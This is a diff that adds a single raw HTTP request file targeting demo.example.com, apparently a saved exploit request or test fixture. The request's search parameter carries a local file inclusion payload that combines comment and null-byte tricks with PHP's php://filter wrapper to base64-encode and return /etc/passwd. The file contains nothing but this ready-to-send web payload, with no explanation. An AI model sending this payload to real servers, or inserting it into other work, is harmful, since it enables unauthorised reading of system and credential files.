@@ -1,0 +1,4 @@
+GET /a?search=/*%00*/php://filter/convert.base64-encode/resource%3D/etc/passwd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
